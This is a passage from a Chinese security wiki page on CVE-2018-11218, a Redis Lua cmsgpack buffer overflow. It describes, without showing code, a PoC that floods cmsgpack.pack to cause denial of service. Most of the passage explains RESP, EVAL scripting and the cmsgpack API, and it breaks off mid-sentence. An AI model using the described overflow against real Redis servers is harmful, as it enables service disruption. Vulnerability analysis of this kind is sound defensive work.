class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1.png"></p><p>​        poc内容为发送一段cmsgpack.pack函数的调用，注入大量的字符，导致拒绝服务。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2.png"></p><p>​        发送后无回包</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p><strong>EVAL script numkeys key [key …] arg [arg …]</strong></p><blockquote><p>可用版本： &gt;= 2.6.0</p><p>时间复杂度： <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 和 EVALSHA 可以在 O(1) 复杂度内找到要被执行的脚本，其余的复杂度取决于执行的脚本本身。</p></blockquote><p>​        从 Redis 2.6.0 版本开始，通过内置的 Lua 解释器，可以使用 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令对 Lua 脚本进行求值。</p><p>​        <code>script</code> 参数是一段 Lua 5.1 脚本程序，它会被运行在 Redis 服务器上下文中，这段脚本不必(也不应该)定义为一个 Lua 函数。</p><p>​        <code>numkeys</code> 参数用于指定键名参数的个数。</p><p>​        键名参数 <code>key [key ...]</code> 从 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 的第三个参数开始算起，表示在脚本中所用到的那些 Redis 键(key)，这些键名参数可以在 Lua 中通过全局变量 <code>KEYS</code> 数组，用 <code>1</code> 为基址的形式访问( <code>KEYS[1]</code> ， <code>KEYS[2]</code> ，以此类推)。</p><p>​        在命令的最后，那些不是键名参数的附加参数 <code>arg [arg ...]</code> ，可以在 Lua 中通过全局变量 <code>ARGV</code> 数组访问，访问的形式和 <code>KEYS</code> 变量类似( <code>ARGV[1]</code> 、 <code>ARGV[2]</code> ，诸如此类)。</p><p>​        上面这几段长长的说明可以用一个简单的例子来概括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;&quot; 2 key1 key2 first second</span><br><span class="line">1) &quot;key1&quot;</span><br><span class="line">2) &quot;key2&quot;</span><br><span class="line">3) &quot;first&quot;</span><br><span class="line">4) &quot;second&quot;</span><br></pre></td></tr></table></figure><p>​        其中 <code>&quot;return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;&quot;</code> 是被求值的 Lua 脚本，数字 <code>2</code> 指定了键名参数的数量， <code>key1</code> 和 <code>key2</code> 是键名参数，分别使用 <code>KEYS[1]</code> 和 <code>KEYS[2]</code> 访问，而最后的 <code>first</code> 和 <code>second</code> 则是附加参数，可以通过 <code>ARGV[1]</code> 和 <code>ARGV[2]</code> 访问它们。</p><p>​        在 Lua 脚本中，可以使用两个不同函数来执行 Redis 命令，它们分别是：</p><ul><li><p><code>redis.call()</code></p></li><li><p><code>redis.pcall()</code></p><p>​    这两个函数的唯一区别在于它们使用不同的方式处理执行命令所产生的错误，在后面的『错误处理』部分会讲到这一点。</p></li></ul><p><code>redis.call()</code> 和 <code>redis.pcall()</code> 两个函数的参数可以是任何格式良好(well formed)的 Redis 命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return redis.call(&#x27;set&#x27;,&#x27;foo&#x27;,&#x27;bar&#x27;)&quot; 0</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>​        需要注意的是，上面这段脚本的确实现了将键 <code>foo</code> 的值设为 <code>bar</code> 的目的，但是，它违反了 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令的语义，因为脚本里使用的所有键都应该由 <code>KEYS</code> 数组来传递，就像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return redis.call(&#x27;set&#x27;,KEYS[1],&#x27;bar&#x27;)&quot; 1 foo</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>​        要求使用正确的形式来传递键(key)是有原因的，因为不仅仅是 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 这个命令，所有的 Redis 命令，在执行之前都会被分析，籍此来确定命令会对哪些键进行操作。</p><p>​        因此，对于 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令来说，必须使用正确的形式来传递键，才能确保分析工作正确地执行。除此之外，使用正确的形式来传递键还有很多其他好处，它的一个特别重要的用途就是确保 Redis 集群可以将你的请求发送到正确的集群节点。(对 Redis 集群的工作还在进行当中，但是脚本功能被设计成可以与集群功能保持兼容。)不过，这条规矩并不是强制性的，从而使得用户有机会滥用(abuse) Redis 单实例配置(single instance configuration)，代价是这样写出的脚本不能被 Redis 集群所兼容。</p><p><strong>在 Lua 数据类型和 Redis 数据类型之间转换</strong></p><p>​        当 Lua 通过 <code>call()</code> 或 <code>pcall()</code> 函数执行 Redis 命令的时候，命令的返回值会被转换成 Lua 数据结构。同样地，当 Lua 脚本在 Redis 内置的解释器里运行时，Lua 脚本的返回值也会被转换成 Redis 协议(protocol)，然后由 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 将值返回给客户端。</p><p>​        数据类型之间的转换遵循这样一个设计原则：如果将一个 Redis 值转换成 Lua 值，之后再将转换所得的 Lua 值转换回 Redis 值，那么这个转换所得的 Redis 值应该和最初时的 Redis 值一样。</p><p>​        换句话说， Lua 类型和 Redis 类型之间存在着一一对应的转换关系。</p><p>​    以下列出的是详细的转换规则：</p><p>​    从 Redis 转换到 Lua ：</p><ul><li>Redis integer reply -&gt; Lua number / Redis 整数转换成 Lua 数字</li><li>Redis bulk reply -&gt; Lua string / Redis bulk 回复转换成 Lua 字符串</li><li>Redis multi bulk reply -&gt; Lua table (may have other Redis data types nested) / Redis 多条 bulk 回复转换成 Lua 表，表内可能有其他别的 Redis 数据类型</li><li>Redis status reply -&gt; Lua table with a single ok field containing the status / Redis 状态回复转换成 Lua 表，表内的 <code>ok</code> 域包含了状态信息</li><li>Redis error reply -&gt; Lua table with a single err field containing the error / Redis 错误回复转换成 Lua 表，表内的 <code>err</code> 域包含了错误信息</li><li>Redis Nil bulk reply and Nil multi bulk reply -&gt; Lua false boolean type / Redis 的 Nil 回复和 Nil 多条回复转换成 Lua 的布尔值 <code>false</code></li></ul><p>从 Lua 转换到 Redis：</p><ul><li>Lua number -&gt; Redis integer reply / Lua 数字转换成 Redis 整数</li><li>Lua string -&gt; Redis bulk reply / Lua 字符串转换成 Redis bulk 回复</li><li>Lua table (array) -&gt; Redis multi bulk reply / Lua 表(数组)转换成 Redis 多条 bulk 回复</li><li>Lua table with a single ok field -&gt; Redis status reply / 一个带单个 <code>ok</code> 域的 Lua 表，转换成 Redis 状态回复</li><li>Lua table with a single err field -&gt; Redis error reply / 一个带单个 <code>err</code> 域的 Lua 表，转换成 Redis 错误回复</li><li>Lua boolean false -&gt; Redis Nil bulk reply / Lua 的布尔值 <code>false</code> 转换成 Redis 的 Nil bulk 回复</li></ul><p>从 Lua 转换到 Redis 有一条额外的规则，这条规则没有和它对应的从 Redis 转换到 Lua 的规则：</p><ul><li>Lua boolean true -&gt; Redis integer reply with value of 1 / Lua 布尔值 <code>true</code> 转换成 Redis 整数回复中的 <code>1</code></li></ul><p>以下是几个类型转换的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return 10&quot; 0</span><br><span class="line">(integer) 10</span><br><span class="line"></span><br><span class="line">&gt; eval &quot;return &#123;1,2,&#123;3,&#x27;Hello World!&#x27;&#125;&#125;&quot; 0</span><br><span class="line">1) (integer) 1</span><br><span class="line">2) (integer) 2</span><br><span class="line">3) 1) (integer) 3</span><br><span class="line">   2) &quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">&gt; eval &quot;return redis.call(&#x27;get&#x27;,&#x27;foo&#x27;)&quot; 0</span><br><span class="line">&quot;bar&quot;</span><br></pre></td></tr></table></figure><p>​        在上面的三个代码示例里，前两个演示了如何将 Lua 值转换成 Redis 值，最后一个例子更复杂一些，它演示了一个将 Redis 值转换成 Lua 值，然后再将 Lua 值转换成 Redis 值的类型转过程。</p><p><strong>脚本的原子性</strong></p><p>​        Redis 使用单个 Lua 解释器去运行所有脚本，并且， Redis 也保证脚本会以原子性(atomic)的方式执行：当某个脚本正在运行的时候，不会有其他脚本或 Redis 命令被执行。这和使用 <a href="http://redisdoc.com/transaction/multi.html#multi">MULTI</a> / <a href="http://redisdoc.com/transaction/exec.html#exec">EXEC</a> 包围的事务很类似。在其他别的客户端看来，脚本的效果(effect)要么是不可见的(not visible)，要么就是已完成的(already completed)。</p><p>​        另一方面，这也意味着，执行一个运行缓慢的脚本并不是一个好主意。写一个跑得很快很顺溜的脚本并不难，因为脚本的运行开销(overhead)非常少，但是当你不得不使用一些跑得比较慢的脚本时，请小心，因为当这些蜗牛脚本在慢吞吞地运行的时候，其他客户端会因为服务器正忙而无法执行命令。</p><p><strong>错误处理</strong></p><p>​        前面的命令介绍部分说过， <code>redis.call()</code> 和 <code>redis.pcall()</code> 的唯一区别在于它们对错误处理的不同。</p><p>​        当 <code>redis.call()</code> 在执行命令的过程中发生错误时，脚本会停止执行，并返回一个脚本错误，错误的输出信息会说明错误造成的原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis&gt; lpush foo a</span><br><span class="line">(integer) 1</span><br><span class="line"></span><br><span class="line">redis&gt; eval &quot;return redis.call(&#x27;get&#x27;, &#x27;foo&#x27;)&quot; 0</span><br><span class="line">(error) ERR Error running script (call to f_282297a0228f48cd3fc6a55de6316f31422f5d17): ERR Operation against a key holding the wrong kind of value</span><br></pre></td></tr></table></figure><p>​        和 <code>redis.call()</code> 不同， <code>redis.pcall()</code> 出错时并不引发(raise)错误，而是返回一个带 <code>err</code> 域的 Lua 表(table)，用于表示错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; EVAL &quot;return redis.pcall(&#x27;get&#x27;, &#x27;foo&#x27;)&quot; 0</span><br><span class="line">(error) ERR Operation against a key holding the wrong kind of value</span><br></pre></td></tr></table></figure><p><strong>带宽和 EVALSHA</strong></p><p>​        <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令要求你在每次执行脚本的时候都发送一次脚本主体(script body)。Redis 有一个内部的缓存机制，因此它不会每次都重新编译脚本，不过在很多场合，付出无谓的带宽来传送脚本主体并不是最佳选择。</p><p>为了减少带宽的消耗， Redis 实现了 EVALSHA 命令，它的作用和 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 一样，都用于对脚本求值，但它接受的第一个参数不是脚本，而是脚本的 SHA1 校验和(sum)。</p><p>EVALSHA 命令的表现如下：</p><ul><li>如果服务器还记得给定的 SHA1 校验和所指定的脚本，那么执行这个脚本</li><li>如果服务器不记得给定的 SHA1 校验和所指定的脚本，那么它返回一个特殊的错误，提醒用户使用 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 代替 EVALSHA</li></ul><p>以下是示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; set foo bar</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">&gt; eval &quot;return redis.call(&#x27;get&#x27;,&#x27;foo&#x27;)&quot; 0</span><br><span class="line">&quot;bar&quot;</span><br><span class="line"></span><br><span class="line">&gt; evalsha 6b1bf486c81ceb7edf3c093f4c48582e38c0e791 0</span><br><span class="line">&quot;bar&quot;</span><br><span class="line"></span><br><span class="line">&gt; evalsha ffffffffffffffffffffffffffffffffffffffff 0</span><br><span class="line">(error) `NOSCRIPT` No matching script. Please use [EVAL](/commands/eval).</span><br></pre></td></tr></table></figure><p>​        客户端库的底层实现可以一直乐观地使用 EVALSHA 来代替 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> ，并期望着要使用的脚本已经保存在服务器上了，只有当 <code>NOSCRIPT</code> 错误发生时，才使用 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令重新发送脚本，这样就可以最大限度地节省带宽。</p><p>​        这也说明了执行 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令时，使用正确的格式来传递键名参数和附加参数的重要性：因为如果将参数硬写在脚本中，那么每次当参数改变的时候，都要重新发送脚本，即使脚本的主体并没有改变，相反，通过使用正确的格式来传递键名参数和附加参数，就可以在脚本主体不变的情况下，直接使用 EVALSHA 命令对脚本进行复用，免去了无谓的带宽消耗。</p><p><strong>脚本缓存</strong></p><p>​        Redis 保证所有被运行过的脚本都会被永久保存在脚本缓存当中，这意味着，当 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令在一个 Redis 实例上成功执行某个脚本之后，随后针对这个脚本的所有 EVALSHA 命令都会成功执行。</p><p>​        刷新脚本缓存的唯一办法是显式地调用 <code>SCRIPT FLUSH</code> 命令，这个命令会清空运行过的所有脚本的缓存。通常只有在云计算环境中，Redis 实例被改作其他客户或者别的应用程序的实例时，才会执行这个命令。</p><p>​        缓存可以长时间储存而不产生内存问题的原因是，它们的体积非常小，而且数量也非常少，即使脚本在概念上类似于实现一个新命令，即使在一个大规模的程序里有成百上千的脚本，即使这些脚本会经常修改，即便如此，储存这些脚本的内存仍然是微不足道的。</p><p>​        事实上，用户会发现 Redis 不移除缓存中的脚本实际上是一个好主意。比如说，对于一个和 Redis 保持持久化链接(persistent connection)的程序来说，它可以确信，执行过一次的脚本会一直保留在内存当中，因此它可以在流水线中使用 EVALSHA 命令而不必担心因为找不到所需的脚本而产生错误(稍候我们会看到在流水线中执行脚本的相关问题)。</p><p><strong>SCRIPT 命令</strong></p><p>Redis 提供了以下几个 SCRIPT 命令，用于对脚本子系统(scripting subsystem)进行控制：</p><ul><li><a href="http://redisdoc.com/script/script_flush.html#script-flush">SCRIPT FLUSH</a> ：清除所有脚本缓存</li><li>[SCRIPT EXISTS sha1 <a href="http://redisdoc.com/script/script_exists.html#script-exists">sha1 …]</a> ：根据给定的脚本校验和，检查指定的脚本是否存在于脚本缓存</li><li><a href="http://redisdoc.com/script/script_load.html#script-load">SCRIPT LOAD script</a> ：将一个脚本装入脚本缓存，但并不立即运行它</li><li><a href="http://redisdoc.com/script/script_kill.html#script-kill">SCRIPT KILL</a> ：杀死当前正在运行的脚本</li></ul><p><strong>纯函数脚本</strong></p><p>在编写脚本方面，一个重要的要求就是，脚本应该被写成纯函数(pure function)。</p><p>也就是说，脚本应该具有以下属性：</p><ul><li>对于同样的数据集输入，给定相同的参数，脚本执行的 Redis 写命令总是相同的。脚本执行的操作不能依赖于任何隐藏(非显式)数据，不能依赖于脚本在执行过程中、或脚本在不同执行时期之间可能变更的状态，并且它也不能依赖于任何来自 I/O 设备的外部输入。</li></ul><p>使用系统时间(system time)，调用像 <a href="http://redisdoc.com/database/randomkey.html#randomkey">RANDOMKEY</a> 那样的随机命令，或者使用 Lua 的随机数生成器，类似以上的这些操作，都会造成脚本的求值无法每次都得出同样的结果。</p><p>为了确保脚本符合上面所说的属性， Redis 做了以下工作：</p><ul><li>Lua 没有访问系统时间或者其他内部状态的命令</li><li>Redis 会返回一个错误，阻止这样的脚本运行： 这些脚本在执行随机命令之后(比如 <a href="http://redisdoc.com/database/randomkey.html#randomkey">RANDOMKEY</a> 、 [SRANDMEMBER key <a href="http://redisdoc.com/set/srandmember.html#srandmember">count]</a> 或 <a href="http://redisdoc.com/client_and_server/time.html#time">TIME</a> 等)，还会执行可以修改数据集的 Redis 命令。如果脚本只是执行只读操作，那么就没有这一限制。注意，随机命令并不一定就指那些带 RAND 字眼的命令，任何带有非确定性的命令都会被认为是随机命令，比如 <a href="http://redisdoc.com/client_and_server/time.html#time">TIME</a> 命令就是这方面的一个很好的例子。</li><li>每当从 Lua 脚本中调用那些返回无序元素的命令时，执行命令所得的数据在返回给 Lua 之前会先执行一个静默(slient)的字典序排序(<a href="http://en.wikipedia.org/wiki/Lexicographical_order">lexicographical sorting</a>)。举个例子，因为 Redis 的 Set 保存的是无序的元素，所以在 Redis 命令行客户端中直接执行 <a href="http://redisdoc.com/set/smembers.html#smembers">SMEMBERS key</a> ，返回的元素是无序的，但是，假如在脚本中执行 <code>redis.call(&quot;smembers&quot;, KEYS[1])</code> ，那么返回的总是排过序的元素。</li><li>对 Lua 的伪随机数生成函数 <code>math.random</code> 和 <code>math.randomseed</code> 进行修改，使得每次在运行新脚本的时候，总是拥有同样的 seed 值。这意味着，每次运行脚本时，只要不使用 <code>math.randomseed</code> ，那么 <code>math.random</code> 产生的随机数序列总是相同的。</li></ul><p>尽管有那么多的限制，但用户还是可以用一个简单的技巧写出带随机行为的脚本(如果他们需要的话)。</p><p>假设现在我们要编写一个 Redis 脚本，这个脚本从列表中弹出 N 个随机数。一个 Ruby 写的例子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;rubygems&#x27;</span><br><span class="line">require &#x27;redis&#x27;</span><br><span class="line"></span><br><span class="line">r = Redis.new</span><br><span class="line"></span><br><span class="line">RandomPushScript = &lt;&lt;EOF</span><br><span class="line">    local i = tonumber(ARGV[1])</span><br><span class="line">    local res</span><br><span class="line">    while (i &gt; 0) do</span><br><span class="line">        res = redis.call(&#x27;lpush&#x27;,KEYS[1],math.random())</span><br><span class="line">        i = i-1</span><br><span class="line">    end</span><br><span class="line">    return res</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">r.del(:mylist)</span><br><span class="line">puts r.eval(RandomPushScript,[:mylist],[10,rand(2**32)])</span><br></pre></td></tr></table></figure><p>这个程序每次运行都会生成带有以下元素的列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; lrange mylist 0 -1</span><br><span class="line">1) &quot;0.74509509873814&quot;</span><br><span class="line">2) &quot;0.87390407681181&quot;</span><br><span class="line">3) &quot;0.36876626981831&quot;</span><br><span class="line">4) &quot;0.6921941534114&quot;</span><br><span class="line">5) &quot;0.7857992587545&quot;</span><br><span class="line">6) &quot;0.57730350670279&quot;</span><br><span class="line">7) &quot;0.87046522734243&quot;</span><br><span class="line">8) &quot;0.09637165539729&quot;</span><br><span class="line">9) &quot;0.74990198051087&quot;</span><br><span class="line">10) &quot;0.17082803611217&quot;</span><br></pre></td></tr></table></figure><p>上面的 Ruby 程序每次都只生成同样的列表，用途并不是太大。那么，该怎样修改这个脚本，使得它仍然是一个纯函数(符合 Redis 的要求)，但是每次调用都可以产生不同的随机元素呢？</p><p>一个简单的办法是，为脚本添加一个额外的参数，让这个参数作为 Lua 的随机数生成器的 seed 值，这样的话，只要给脚本传入不同的 seed ，脚本就会生成不同的列表元素。</p><p>以下是修改后的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">RandomPushScript = &lt;&lt;EOF</span><br><span class="line">    local i = tonumber(ARGV[1])</span><br><span class="line">    local res</span><br><span class="line">    math.randomseed(tonumber(ARGV[2]))</span><br><span class="line">    while (i &gt; 0) do</span><br><span class="line">        res = redis.call(&#x27;lpush&#x27;,KEYS[1],math.random())</span><br><span class="line">        i = i-1</span><br><span class="line">    end</span><br><span class="line">    return res</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">r.del(:mylist)</span><br><span class="line">puts r.eval(RandomPushScript,1,:mylist,10,rand(2**32))</span><br></pre></td></tr></table></figure><p>尽管对于同样的 seed ，上面的脚本产生的列表元素是一样的(因为它是一个纯函数)，但是只要每次在执行脚本的时候传入不同的 seed ，我们就可以得到带有不同随机元素的列表。</p><p>Seed 会在复制(replication link)和写 AOF 文件时作为一个参数来传播，保证在载入 AOF 文件或附属节点(slave)处理脚本时， seed 仍然可以及时得到更新。</p><p>注意，Redis 实现保证 <code>math.random</code> 和 <code>math.randomseed</code> 的输出和运行 Redis 的系统架构无关，无论是 32 位还是 64 位系统，无论是小端(little endian)还是大端(big endian)系统，这两个函数的输出总是相同的。</p><p><strong>全局变量保护</strong></p><p>​        为了防止不必要的数据泄漏进 Lua 环境， Redis 脚本不允许创建全局变量。如果一个脚本需要在多次执行之间维持某种状态，它应该使用 Redis key 来进行状态保存。</p><p>​        企图在脚本中访问一个全局变量(不论这个变量是否存在)将引起脚本停止， <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令会返回一个错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; eval &#x27;a=10&#x27; 0</span><br><span class="line">(error) ERR Error running script (call to f_933044db579a2f8fd45d8065f04a8d0249383e57): user_script:1: Script attempted to create global variable &#x27;a&#x27;</span><br></pre></td></tr></table></figure><p>​        Lua 的 debug 工具，或者其他设施，比如打印（alter）用于实现全局保护的 meta table ，都可以用于实现全局变量保护。</p><p>​        实现全局变量保护并不难，不过有时候还是会不小心而为之。一旦用户在脚本中混入了 Lua 全局状态，那么 AOF 持久化和复制（replication）都会无法保证，所以，请不要使用全局变量。</p><p>​        避免引入全局变量的一个诀窍是：将脚本中用到的所有变量都使用 <code>local</code> 关键字定义为局部变量。</p><p><strong>库</strong></p><p>Redis 内置的 Lua 解释器加载了以下 Lua 库：</p><ul><li><p><code>base</code></p></li><li><p><code>table</code></p></li><li><p><code>string</code></p></li><li><p><code>math</code></p></li><li><p><code>debug</code></p></li><li><p><code>cjson</code></p></li><li><p><code>cmsgpack</code></p><p>其中 <code>cjson</code> 库可以让 Lua 以非常快的速度处理 JSON 数据，除此之外，其他别的都是 Lua 的标准库。</p><p>每个 Redis 实例都保证会加载上面列举的库，从而确保每个 Redis 脚本的运行环境都是相同的。</p></li></ul><p><strong>cmsgpack</strong></p><p>​        Lua-cmsgpack是<a href="http://msgpack.org/">MessagePack的</a>一个实现，它是一个Lua 5.1 / 5.2 / 5.3在一个没有外部依赖性的自包含C文件中的绑定。</p><p>该库是根据BSD两条款许可获得许可的开源软件。</p><p><strong>用法</strong></p><p>导出的API非常简单，包含四个功能：</p><p>基本API：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msgpack = cmsgpack.pack(lua_object1, lua_object2, ..., lua_objectN)</span><br><span class="line">lua_object1, lua_object2, ..., lua_objectN = cmsgpack.unpack(msgpack)</span><br></pre></td></tr></table></figure><p>详细的API使您可以更好地控制解压缩多个值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resume_offset, lua_object1 = cmsgpack.unpack_one(msgpack)</span><br><span class="line">resume_offset1, lua_object2 = cmsgpack.unpack_one(msgpack, resume_offset)</span><br><span class="line">...</span><br><span class="line">-1, lua_objectN = cmsgpack.unpack_one(msgpack, resume_offset_previous)</span><br><span class="line"></span><br><span class="line">resume_offset, lua_object1, lua_object2 = cmsgpack.unpack_limit(msgpack, 2)</span><br><span class="line">resume_offset2, lua_object3 = cmsgpack.unpack_limit(msgpack, 1, resume_offset1)</span><br></pre></td></tr></table></figure><p>作用：</p><ul><li><p><code>pack(arg1, arg2, ..., argn)</code>-将任意数量的lua对象打包到一个msgpack流中。返回：msgpack</p></li><li><p><code>unpack(msgpack)</code>-将msgpack中的所有对象解压缩为单独的返回值。返回：object1，object2，…，objectN</p></li><li><p><code>unpack_one(msgpack); unpack_one(msgpack, offset)</code>-偏移后解压缩第一个对象。返回：偏移量，对象</p></li><li><p><code>unpack_limit(msgpack, limit); unpack_limit(msgpack, limit, offset)</code>-解压缩第一个<code>limit</code>对象并返回：offset，object1，objet2，…，objectN（上限，但如果没有很多要解压缩的对象，则返回的数量可能少于限制）</p><p>​    当您使用<code>unpack_one</code>或到达输入流的末尾时，将返回<code>unpack_limit</code>的偏移量<code>-1</code>。</p><p>​    你可能会<code>require &quot;msgpack&quot;</code>也可能会<code>require 